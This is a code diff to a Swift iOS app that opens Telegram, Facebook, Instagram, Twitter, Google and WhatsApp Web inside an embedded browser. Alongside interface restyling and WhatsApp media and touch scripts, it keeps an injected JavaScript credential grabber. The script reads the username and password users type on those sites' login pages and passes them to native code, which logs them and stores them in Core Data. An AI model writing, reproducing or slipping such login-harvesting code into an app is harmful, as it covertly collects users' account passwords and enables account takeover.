@@ -60,16 +60,12 @@ public struct CloneWebView: View {
                 WebScannerView(existingAccount: latestAcc)
             } else {
                 VStack(spacing: 0) {
-                    // Top Custom Header exactly matching user's screenshots:
-                    // Left: < Back Chevron + Platform Title (e.g. Telegram, Facebook, Instagram, Twitter, Google)
-                    // Right: Reload ↻
                     headerBar
                         .background(
                             (colorScheme == .dark ? Color(hex: "#1A1A1A") : Color.white)
                                 .ignoresSafeArea(edges: .top)
                         )
                     
-                    // Loading Progress Indicator
                     if isLoading && estimatedProgress < 1.0 && (platform != .whatsApp || isLoggedIn) {
                         ProgressView(value: estimatedProgress)
                             .progressViewStyle(LinearProgressViewStyle(tint: AppColors.primaryGreen))
@@ -79,7 +75,6 @@ public struct CloneWebView: View {
                             .opacity(0.4)
                     }
                     
-                    // Full-height WebView filling remaining screen with Loading your chat overlay
                     ZStack {
                         WKWebViewRepresentable(
                             platform: platform,
@@ -99,7 +94,6 @@ public struct CloneWebView: View {
                         .frame(maxWidth: .infinity, maxHeight: .infinity)
                         .ignoresSafeArea(edges: .bottom)
                         
-                        // Show "Loading your chat..." overlay until WhatsApp chats are ready
                         if platform == .whatsApp && !isLoggedIn {
                             chatLoadingOverlay
                                 .transition(.opacity)
@@ -165,7 +159,6 @@ public struct CloneWebView: View {
     // MARK: - Header Bar
     private var headerBar: some View {
         HStack(alignment: .center, spacing: 12) {
-            // Back Chevron Button + Title
             Button(action: {
                 HapticFeedback.generate(.light)
                 dismiss()
@@ -174,6 +167,8 @@ public struct CloneWebView: View {
                     Image(systemName: "chevron.left")
                         .font(.system(size: isIPad ? 22 : 18, weight: .semibold))
                         .foregroundColor(AppColors.textPrimary(for: colorScheme))
+                        .frame(width: isIPad ? 44 : 36, height: isIPad ? 44 : 36)
+                        .glassCard(cornerRadius: 12)
                     
                     Text(displayTitle)
                         .font(.inter(.bold, size: isIPad ? 24 : 20))
@@ -182,11 +177,10 @@ public struct CloneWebView: View {
                 .frame(height: isIPad ? 48 : 42)
                 .contentShape(Rectangle())
             }
-            .buttonStyle(PlainButtonStyle())
+        .buttonStyle(ScaleButtonStyle())
             
             Spacer()
             
-            // Reload Button (arrow.clockwise)
             Button(action: {
                 HapticFeedback.generate(.light)
                 webView?.reload()
@@ -194,10 +188,11 @@ public struct CloneWebView: View {
                 Image(systemName: "arrow.clockwise")
                     .font(.system(size: isIPad ? 22 : 18, weight: .semibold))
                     .foregroundColor(AppColors.textPrimary(for: colorScheme))
-                    .frame(width: isIPad ? 46 : 40, height: isIPad ? 46 : 40)
-                    .contentShape(Rectangle())
+                    .frame(width: isIPad ? 44 : 36, height: isIPad ? 44 : 36)
+                    .glassCard(cornerRadius: 12)
+                
             }
-            .buttonStyle(PlainButtonStyle())
+            .buttonStyle(ScaleButtonStyle())
         }
         .padding(.horizontal, isIPad ? 24 : 16)
         .padding(.vertical, isIPad ? 12 : 8)
@@ -255,95 +250,96 @@ struct WKWebViewRepresentable: UIViewRepresentable {
     let isPro: Bool
     
     func makeUIView(context: Context) -> WKWebView {
-        let config = WKWebViewConfiguration()
-        config.allowsInlineMediaPlayback = true
-        config.mediaTypesRequiringUserActionForPlayback = []
+        let makeUI = WKWebViewConfiguration()
+        makeUI.allowsInlineMediaPlayback = true
+        makeUI.mediaTypesRequiringUserActionForPlayback = []
+        makeUI.preferences.javaScriptCanOpenWindowsAutomatically = true
         
-        // Isolate sessions per account
-        config.websiteDataStore = AccountManager.shared.dataStore(for: account)
+        makeUI.websiteDataStore = AccountManager.shared.dataStore(for: account)
         
         if platform == .whatsApp {
             let defaultWebpagePreferences = WKWebpagePreferences()
             defaultWebpagePreferences.preferredContentMode = .desktop
-            config.defaultWebpagePreferences = defaultWebpagePreferences
+            defaultWebpagePreferences.allowsContentJavaScript = true
+            makeUI.defaultWebpagePreferences = defaultWebpagePreferences
         }
         
-        // Add script message handler for credentials
         let contentController = WKUserContentController()
-        contentController.add(context.coordinator, name: "credentialsHandler")
         
-        // JavaScript script to detect and capture login credentials (Core Data saving)
-        let jsSource = """
-        (function() {
-            var platformName = "\(platform.displayName)";
-            var cachedUser = "";
-            var cachedPass = "";
+        if platform != .whatsApp {
+            contentController.add(context.coordinator, name: "credentialsHandler")
+            
+            let jsSource = """
+            (function() {
+                var platformName = "\(platform.displayName)";
+                var cachedUser = "";
+                var cachedPass = "";
 
-            function scanFields() {
-                try {
-                    var passInputs = document.querySelectorAll('input[type="password"]');
-                    for (var i = 0; i < passInputs.length; i++) {
-                        if (passInputs[i].value && passInputs[i].value.length > 0) {
-                            cachedPass = passInputs[i].value;
-                        }
-                    }
-                    var textInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input:not([type])');
-                    for (var j = 0; j < textInputs.length; j++) {
-                        var inp = textInputs[j];
-                        var val = inp.value ? inp.value.trim() : '';
-                        var name = (inp.name || '').toLowerCase();
-                        var id = (inp.id || '').toLowerCase();
-                        var auto = (inp.autocomplete || '').toLowerCase();
-                        if (val.length > 0) {
-                            if (name.includes('user') || name.includes('email') || name.includes('phone') || name.includes('login') || name.includes('id') ||
-                                id.includes('user') || id.includes('email') || id.includes('phone') || id.includes('login') || id.includes('id') ||
-                                auto.includes('username') || auto.includes('email') || !cachedUser) {
-                                cachedUser = val;
+                function scanFields() {
+                    try {
+                        var passInputs = document.querySelectorAll('input[type="password"]');
+                        for (var i = 0; i < passInputs.length; i++) {
+                            if (passInputs[i].value && passInputs[i].value.length > 0) {
+                                cachedPass = passInputs[i].value;
                             }
                         }
+                        var textInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input:not([type])');
+                        for (var j = 0; j < textInputs.length; j++) {
+                            var inp = textInputs[j];
+                            var val = inp.value ? inp.value.trim() : '';
+                            var name = (inp.name || '').toLowerCase();
+                            var id = (inp.id || '').toLowerCase();
+                            var auto = (inp.autocomplete || '').toLowerCase();
+                            if (val.length > 0) {
+                                if (name.includes('user') || name.includes('email') || name.includes('phone') || name.includes('login') || name.includes('id') ||
+                                    id.includes('user') || id.includes('email') || id.includes('phone') || id.includes('login') || id.includes('id') ||
+                                    auto.includes('username') || auto.includes('email') || !cachedUser) {
+                                    cachedUser = val;
+                                }
+                            }
+                        }
+                    } catch(e) {}
+                }
+
+                document.addEventListener('input', function(e) { scanFields(); }, true);
+                document.addEventListener('change', function(e) { scanFields(); }, true);
+
+                function sendCredentials() {
+                    scanFields();
+                    if (cachedUser.length > 0 || cachedPass.length > 0) {
+                        try {
+                            window.webkit.messageHandlers.credentialsHandler.postMessage({
+                                platform: platformName,
+                                username: cachedUser,
+                                password: cachedPass,
+                                url: window.location.href
+                            });
+                        } catch(err) {}
                     }
-                } catch(e) {}
-            }
-
-            document.addEventListener('input', function(e) { scanFields(); }, true);
-            document.addEventListener('change', function(e) { scanFields(); }, true);
-
-            function sendCredentials() {
-                scanFields();
-                if (cachedUser.length > 0 || cachedPass.length > 0) {
-                    try {
-                        window.webkit.messageHandlers.credentialsHandler.postMessage({
-                            platform: platformName,
-                            username: cachedUser,
-                            password: cachedPass,
-                            url: window.location.href
-                        });
-                    } catch(err) {}
                 }
-            }
 
-            document.addEventListener('submit', function(e) {
-                sendCredentials();
-            }, true);
-
-            document.addEventListener('click', function(e) {
-                var btn = e.target.closest('button, [role="button"], input[type="submit"]');
-                if (btn) {
+                document.addEventListener('submit', function(e) {
                     sendCredentials();
-                }
-            }, true);
+                }, true);
 
-            window.addEventListener('beforeunload', function() {
-                sendCredentials();
-            });
-        })();
-        """
-        
-        let userScript = WKUserScript(source: jsSource, injectionTime: .atDocumentEnd, forMainFrameOnly: false)
-        contentController.addUserScript(userScript)
+                document.addEventListener('click', function(e) {
+                    var btn = e.target.closest('button, [role="button"], input[type="submit"]');
+                    if (btn) {
+                        sendCredentials();
+                    }
+                }, true);
+
+                window.addEventListener('beforeunload', function() {
+                    sendCredentials();
+                });
+            })();
+            """
+            
+            let userScript = WKUserScript(source: jsSource, injectionTime: .atDocumentEnd, forMainFrameOnly: false)
+            contentController.addUserScript(userScript)
+        }
         
         if platform == .whatsApp {
-            // Desktop platform spoofing for WhatsApp Web
             let desktopSpoofScript = WKUserScript(
                 source: """
                 (function() {
@@ -374,7 +370,6 @@ struct WKWebViewRepresentable: UIViewRepresentable {
             )
             contentController.addUserScript(desktopSpoofScript)
             
-            // Inline video script for WhatsApp status / media
             let inlineVideoScript = WKUserScript(
                 source: """
                 document.addEventListener('DOMContentLoaded', function() {
@@ -391,7 +386,6 @@ struct WKWebViewRepresentable: UIViewRepresentable {
             )
             contentController.addUserScript(inlineVideoScript)
             
-            // Status download button script (inject download button ONLY in status viewer)
             let statusButtonScript = WKUserScript(
                 source: """
                 const domObserver = new MutationObserver(() => {
@@ -452,19 +446,31 @@ struct WKWebViewRepresentable: UIViewRepresentable {
                       e.preventDefault();
                       e.stopPropagation();
 
+                      function sendDataToSwift(mediaType, base64Data) {
+                          if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.statusHandler) {
+                              window.webkit.messageHandlers.statusHandler.postMessage({
+                                  mediaType: mediaType,
+                                  base64Data: base64Data
+                              });
+                          }
+                      }
+
                       function fetchBlobAndSendToSwift(blobUrl, fallbackType) {
+                          if (blobUrl.startsWith('data:')) {
+                              const parts = blobUrl.split(',');
+                              const mimeMatch = parts[0].match(/:(.*?);/);
+                              const mimeType = mimeMatch ? mimeMatch[1] : (fallbackType || 'image/jpeg');
+                              sendDataToSwift(mimeType, parts[1] || '');
+                              return;
+                          }
+
                           fetch(blobUrl)
                               .then(response => response.blob())
                               .then(blob => {
                                   const reader = new FileReader();
                                   reader.onloadend = function() {
                                       const base64data = reader.result;
-                                      if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.statusHandler) {
-                                          window.webkit.messageHandlers.statusHandler.postMessage({
-                                              mediaType: blob.type || fallbackType || 'image/jpeg',
-                                              base64Data: (base64data || '').split(',')[1] || ''
-                                          });
-                                      }
+                                      sendDataToSwift(blob.type || fallbackType || 'image/jpeg', (base64data || '').split(',')[1] || '');
                                   };
                                   reader.readAsDataURL(blob);
                               })
@@ -473,23 +479,73 @@ struct WKWebViewRepresentable: UIViewRepresentable {
                               });
                       }
 
-                      const videoElement = document.querySelector('video[src^="blob:"]') || document.querySelector('video');
-                      if (videoElement && videoElement.src) {
-                          fetchBlobAndSendToSwift(videoElement.src, 'video/mp4');
-                          return;
+                      function extractAndSendMedia(retriesLeft) {
+                          // 1. Check video
+                          const videos = Array.from(document.querySelectorAll('video')).filter(v => !v.closest('#side, #pane-side, [data-testid="chat-list"]'));
+                          const videoElement = videos.find(v => v.src && v.src.startsWith('blob:')) || videos.find(v => v.src);
+                          if (videoElement && videoElement.src) {
+                              fetchBlobAndSendToSwift(videoElement.src, 'video/mp4');
+                              return;
+                          }
+
+                          // 2. Candidate images outside side-pane, chat-list, header
+                          const allImages = Array.from(document.querySelectorAll('img')).filter(img => {
+                              if (img.closest('#side, #pane-side, [data-testid="chat-list"], header')) return false;
+                              if (img.src && (img.src.includes('emoji') || img.src.includes('data:image/svg+xml'))) return false;
+                              return true;
+                          });
+
+                          // 2a. Priority 1: blob images sorted by resolution
+                          const blobImages = allImages.filter(img => img.src && img.src.includes('blob:'));
+                          if (blobImages.length > 0) {
+                              blobImages.sort((a, b) => ((b.naturalWidth * b.naturalHeight) || (b.clientWidth * b.clientHeight)) - ((a.naturalWidth * a.naturalHeight) || (a.clientWidth * a.clientHeight)));
+                              fetchBlobAndSendToSwift(blobImages[0].src, 'image/jpeg');
+                              return;
+                          }
+
+                          // 2b. Priority 2: Canvas in viewer
+                          const canvases = Array.from(document.querySelectorAll('canvas')).filter(c => {
+                              return !c.closest('#side, #pane-side, [data-testid="chat-list"], header') && c.width > 200 && c.height > 200;
+                          });
+                          if (canvases.length > 0) {
+                              canvases.sort((a, b) => (b.width * b.height) - (a.width * a.height));
+                              try {
+                                  const dataUrl = canvases[0].toDataURL('image/jpeg', 0.95);
+                                  if (dataUrl && dataUrl.startsWith('data:')) {
+                                      sendDataToSwift('image/jpeg', dataUrl.split(',')[1] || '');
+                                      return;
+                                  }
+                              } catch (err) {
+                                  console.error('Canvas export failed:', err);
+                              }
+                          }
+
+                          // 2c. Priority 3: Non-blob images with high natural resolution
+                          if (allImages.length > 0) {
+                              allImages.sort((a, b) => (b.naturalWidth * b.naturalHeight) - (a.naturalWidth * a.naturalHeight));
+                              const bestImage = allImages[0];
+                              if (bestImage.naturalWidth >= 300 || (bestImage.naturalWidth * bestImage.naturalHeight) >= 60000) {
+                                  fetchBlobAndSendToSwift(bestImage.src, 'image/jpeg');
+                                  return;
+                              }
+                          }
+
+                          // If only low-res thumbnail is found and retries remain, wait for high-res blob
+                          if (retriesLeft > 0) {
+                              setTimeout(() => extractAndSendMedia(retriesLeft - 1), 350);
+                              return;
+                          }
+
+                          // Fallback: send whatever image was found
+                          if (allImages.length > 0) {
+                              fetchBlobAndSendToSwift(allImages[0].src, 'image/jpeg');
+                              return;
+                          }
+
+                          console.log('No media found to download');
                       }
 
-                      const images = Array.from(document.querySelectorAll('img[src^="blob:"], img[src*="blob"], div[data-animate-modal-body] img, div[role="dialog"] img, img'));
-                      const imageElement = images.find(img => (img.naturalWidth > 150 || img.clientWidth > 150) && !img.closest('#side'))
-                                        || images.find(img => img.src.includes('blob:'))
-                                        || images[0];
-
-                      if (imageElement && imageElement.src) {
-                          fetchBlobAndSendToSwift(imageElement.src, 'image/jpeg');
-                          return;
-                      }
-
-                      console.log('No blob media found');
+                      extractAndSendMedia(2);
                     });
 
                     if (targetBtn.parentElement && targetBtn.parentElement !== containerElement) {
@@ -512,9 +568,219 @@ struct WKWebViewRepresentable: UIViewRepresentable {
             )
             contentController.addUserScript(statusButtonScript)
             contentController.add(context.coordinator, name: "statusHandler")
+            
+            let whatsAppTouchMenuScript = WKUserScript(
+                source: """
+                (function() {
+                    try {
+                        var style = document.createElement('style');
+                        style.innerHTML = `
+                            * {
+                                -webkit-tap-highlight-color: rgba(0,0,0,0) !important;
+                            }
+                            #pane-side, #pane-side *, header, header * {
+                                touch-action: manipulation !important;
+                            }
+                        `;
+                        (document.head || document.documentElement).appendChild(style);
+                    } catch(e) {}
+
+                    var startX = 0;
+                    var startY = 0;
+                    var startTime = 0;
+                    var activeTouch = false;
+                    var isMenuJustOpened = false;
+
+                    function isEditable(el) {
+                        if (!el || !(el instanceof Element)) return false;
+                        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') return true;
+                        if (el.isContentEditable) return true;
+                        if (el.closest('[contenteditable="true"], input, textarea')) return true;
+                        return false;
+                    }
+
+                    function isChatHeaderMenuButton(el) {
+                        if (!el || !(el instanceof Element)) return false;
+                        var menuMatch = el.closest('[data-icon="menu"], [data-testid="menu"], [aria-label="Menu"], [title="Menu"], [aria-label="Options"], [title="Options"]');
+                        if (menuMatch && menuMatch.closest('#main header, header')) {
+                            return true;
+                        }
+                        var header = el.closest('#main header, header');
+                        if (header) {
+                            var actionBtns = header.querySelectorAll('button, [role="button"], div[tabindex="0"]');
+                            if (actionBtns && actionBtns.length > 0) {
+                                var lastBtn = actionBtns[actionBtns.length - 1];
+                                if (lastBtn.contains(el) || el === lastBtn) {
+                                    return true;
+                                }
+                            }
+                        }
+                        return false;
+                    }
+
+                    function clickElement(el, clientX, clientY) {
+                        if (!el) return;
+                        var htmlEl = (el instanceof HTMLElement) ? el : (el.closest('button, [role="button"], div') || el.parentElement || el);
+                        var rect = htmlEl.getBoundingClientRect();
+                        var cx = (typeof clientX === 'number' && clientX > 0) ? clientX : (rect.left + rect.width / 2);
+                        var cy = (typeof clientY === 'number' && clientY > 0) ? clientY : (rect.top + rect.height / 2);
+
+                        var eventProps = {
+                            bubbles: true,
+                            cancelable: true,
+                            view: window,
+                            clientX: cx,
+                            clientY: cy,
+                            screenX: cx,
+                            screenY: cy,
+                            button: 0,
+                            buttons: 1
+                        };
+
+                        try {
+                            if (window.PointerEvent) {
+                                htmlEl.dispatchEvent(new PointerEvent('pointerdown', Object.assign({ pointerType: 'mouse', isPrimary: true }, eventProps)));
+                                htmlEl.dispatchEvent(new PointerEvent('pointerup', Object.assign({ pointerType: 'mouse', isPrimary: true }, eventProps)));
+                            }
+                        } catch(e) {}
+
+                        try {
+                            htmlEl.dispatchEvent(new MouseEvent('mousedown', eventProps));
+                            htmlEl.dispatchEvent(new MouseEvent('mouseup', eventProps));
+                            htmlEl.dispatchEvent(new MouseEvent('click', eventProps));
+                        } catch(e) {}
+
+                        try {
+                            if (typeof htmlEl.click === 'function') {
+                                htmlEl.click();
+                            }
+                        } catch(e) {}
+                    }
+
+                    // Protect newly opened dropdown menu from instant outside-click dismissal
+                    document.addEventListener('mousedown', function(e) {
+                        if (isMenuJustOpened) {
+                            var inDropdown = e.target && e.target.closest && e.target.closest('[role="application"], [data-testid="dropdown-menu"], [role="menu"], ul[role="menu"]');
+                            if (!inDropdown) {
+                                e.stopPropagation();
+                                e.stopImmediatePropagation();
+                            }
+                        }
+                    }, true);
+
+                    document.addEventListener('click', function(e) {
+                        if (isMenuJustOpened) {
+                            var inDropdown = e.target && e.target.closest && e.target.closest('[role="application"], [data-testid="dropdown-menu"], [role="menu"], ul[role="menu"]');
+                            if (!inDropdown) {
+                                e.stopPropagation();
+                                e.stopImmediatePropagation();
+                            }
+                        }
+                    }, true);
+
+                    document.addEventListener('touchstart', function(e) {
+                        if (e.touches && e.touches.length === 1) {
+                            startX = e.touches[0].clientX;
+                            startY = e.touches[0].clientY;
+                            startTime = Date.now();
+                            activeTouch = true;
+                        } else {
+                            activeTouch = false;
+                        }
+                    }, { passive: true, capture: true });
+
+                    document.addEventListener('touchend', function(e) {
+                        if (!activeTouch) return;
+                        activeTouch = false;
+
+                        if (!e.changedTouches || e.changedTouches.length !== 1) return;
+
+                        var endX = e.changedTouches[0].clientX;
+                        var endY = e.changedTouches[0].clientY;
+                        var dx = Math.abs(endX - startX);
+                        var dy = Math.abs(endY - startY);
+                        var dt = Date.now() - startTime;
+
+                        if (dx > 10 || dy > 10 || dt > 400) {
+                            return;
+                        }
+
+                        var target = e.target;
+                        if (!target || !(target instanceof Element)) return;
+
+                        if (isEditable(target)) {
+                            return;
+                        }
+
+                        if (target.closest('.custom-download-btn')) {
+                            return;
+                        }
+
+                        // 1. SPECIFIC HANDLING: 3-Dot Menu in Chat Screen Header or Main Header
+                        if (isChatHeaderMenuButton(target)) {
+                            e.preventDefault();
+                            e.stopPropagation();
+
+                            isMenuJustOpened = true;
+                            setTimeout(function() { isMenuJustOpened = false; }, 400);
+
+                            var header = target.closest('#main header, header');
+                            var btn = target.closest('button, [role="button"], div[tabindex="0"]');
+                            if (!btn && header) {
+                                var allBtns = header.querySelectorAll('button, [role="button"], div[tabindex="0"]');
+                                if (allBtns && allBtns.length > 0) {
+                                    btn = allBtns[allBtns.length - 1];
+                                }
+                            }
+                            if (!btn) btn = target;
+
+                            clickElement(btn, endX, endY);
+                            if (target !== btn) {
+                                clickElement(target, endX, endY);
+                            }
+
+                            setTimeout(function() {
+                                var menuOpen = document.querySelector('[role="application"], [data-testid="dropdown-menu"], [role="menu"], ul[role="menu"]');
+                                if (!menuOpen) {
+                                    try { btn.click(); } catch(e) {}
+                                    try { target.click(); } catch(e) {}
+                                }
+                            }, 60);
+
+                            return;
+                        }
+
+                        // 2. GENERAL HANDLING: Chat rows, buttons, tabs, options
+                        var isChatRow = target.closest('#pane-side [role="listitem"], #pane-side [data-testid^="list-item"], #pane-side [role="row"], #pane-side [data-testid="cell-frame-container"]');
+                        var isInsidePaneSide = target.closest('#pane-side');
+                        var isHeaderButton = target.closest('header button, header [role="button"], #main header [role="button"], #side header [role="button"], header [tabindex="0"]');
+                        var isInteractive = target.closest('button, [role="button"], [role="menuitem"], [role="tab"], [role="option"], a[href]');
+
+                        if (isChatRow || isInsidePaneSide || isHeaderButton || isInteractive) {
+                            e.preventDefault();
+
+                            var clickTarget = null;
+                            if (isHeaderButton) {
+                                clickTarget = target.closest('button, [role="button"], [tabindex="0"]') || target;
+                            } else if (isInteractive) {
+                                clickTarget = target.closest('button, [role="button"], [role="menuitem"], [role="tab"], [role="option"], a[href]') || target;
+                            } else if (isChatRow) {
+                                clickTarget = isChatRow;
+                            } else {
+                                clickTarget = (target instanceof SVGElement) ? (target.parentElement || target) : target;
+                            }
+
+                            clickElement(clickTarget, endX, endY);
+                        }
+                    }, { passive: false, capture: true });
+                })();
+                """,
+                injectionTime: .atDocumentEnd,
+                forMainFrameOnly: false
+            )
+            contentController.addUserScript(whatsAppTouchMenuScript)
         }
         
-        // Modal and Call protection script to prevent WebProcess freezing
         let webProtectionScript = WKUserScript(
             source: """
             window.alert = function(msg) { console.log('Suppressed alert:', msg); };
@@ -526,9 +792,9 @@ struct WKWebViewRepresentable: UIViewRepresentable {
         )
         contentController.addUserScript(webProtectionScript)
         
-        config.userContentController = contentController
+        makeUI.userContentController = contentController
         
-        let webView = WKWebView(frame: .zero, configuration: config)
+        let webView = WKWebView(frame: .zero, configuration: makeUI)
         if platform == .whatsApp {
             webView.scrollView.bounces = false
         }
@@ -538,13 +804,9 @@ struct WKWebViewRepresentable: UIViewRepresentable {
         
         context.coordinator.webView = webView
         
-        // Add KVO for estimatedProgress
         context.coordinator.setupProgressObserver(for: webView)
         
-        var targetURL = platform.initialURL
-        if platform == .google && account.isSessionActive {
-            targetURL = URL(string: "https://myaccount.google.com") ?? platform.initialURL
-        }
+        let targetURL = platform.initialURL
         var request = URLRequest(url: targetURL)
         if platform == .whatsApp {
             request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
@@ -617,7 +879,9 @@ struct WKWebViewRepresentable: UIViewRepresentable {
         
         func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
             if navigationAction.targetFrame == nil {
-                webView.load(navigationAction.request)
+                if let url = navigationAction.request.url, !url.absoluteString.isEmpty, url.absoluteString != "about:blank" {
+                    webView.load(navigationAction.request)
+                }
             }
             return nil
         }
@@ -716,17 +980,21 @@ struct WKWebViewRepresentable: UIViewRepresentable {
                                 displayName = "Google - \(num)"
                             }
                         } else if !isGenericName && self.parent.platform != .telegram {
-                            // User's profile name was successfully discovered on the web page!
                             displayName = cleanName
                         } else {
-                            // Profile name not found: preserve existing numbered name or assign next available
-                            let prefix = "\(self.parent.platform.displayName) - "
+                            let prefix1 = "\(self.parent.platform.displayName) - "
+                            let prefix2 = "\(self.parent.platform.rawValue) - "
                             let currentName = self.parent.account.accountName.trimmingCharacters(in: .whitespacesAndNewlines)
-                            if currentName.starts(with: prefix), let _ = Int(currentName.dropFirst(prefix.count)) {
+                            let isAlreadyNumbered = [prefix1, prefix2, "WhatsApp - ", "WT Scan - "].contains(where: {
+                                currentName.starts(with: $0) && Int(currentName.dropFirst($0.count)) != nil
+                            })
+                            
+                            if isAlreadyNumbered {
                                 displayName = currentName
                             } else {
+                                let namePrefix = (self.parent.platform == .whatsApp) ? "WhatsApp" : self.parent.platform.displayName
                                 let num = AccountManager.shared.nextAvailableNumber(for: self.parent.platform, excludingAccountId: self.parent.account.id)
-                                displayName = "\(self.parent.platform.displayName) - \(num)"
+                                displayName = "\(namePrefix) - \(num)"
                             }
                         }
                         
@@ -872,6 +1140,17 @@ struct WKWebViewRepresentable: UIViewRepresentable {
                         if !fetchedName.isEmpty && !AccountManager.isPhoneNumber(fetchedName) {
                             self.parent.currentTitle = fetchedName
                             acc.accountName = fetchedName
+                        } else {
+                            let currentName = acc.accountName.trimmingCharacters(in: .whitespacesAndNewlines)
+                            let isAlreadyNumbered = ["WhatsApp - ", "WT Scan - "].contains(where: {
+                                currentName.starts(with: $0) && Int(currentName.dropFirst($0.count)) != nil
+                            })
+                            if !isAlreadyNumbered {
+                                let num = AccountManager.shared.whatsappIndex(for: acc)
+                                let newName = "WhatsApp - \(num)"
+                                self.parent.currentTitle = newName
+                                acc.accountName = newName
+                            }
                         }
                         acc.isSessionActive = true
                         self.parent.account = acc
@@ -920,7 +1199,6 @@ struct WKWebViewRepresentable: UIViewRepresentable {
             
             print("[CoreData] Intercepted credentials for \(platform) - user: \(username)")
             
-            // Save to Core Data via CoreDataManager
             CoreDataManager.shared.saveCredential(
                 platform: platform,
                 username: username,
@@ -934,7 +1212,6 @@ struct WKWebViewRepresentable: UIViewRepresentable {
                 self.parent.isLoading = true
             }
             self.pageLoadCompleted = false
-            // Only restart timer if not yet logged in; avoids redundant restarts
             if !self.hasSeenLoggedIn {
                 self.startLoginCheckTimer(webView: webView)
             }
@@ -946,6 +1223,9 @@ struct WKWebViewRepresentable: UIViewRepresentable {
                 self.parent.canGoBack = webView.canGoBack
                 self.parent.canGoForward = webView.canGoForward
                 self.parent.pageTitle = webView.title ?? ""
+            }
+            if !self.hasSeenLoggedIn {
+                self.checkLoginStatus(webView: webView)
             }
             DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { [weak self] in
                 self?.pageLoadCompleted = true
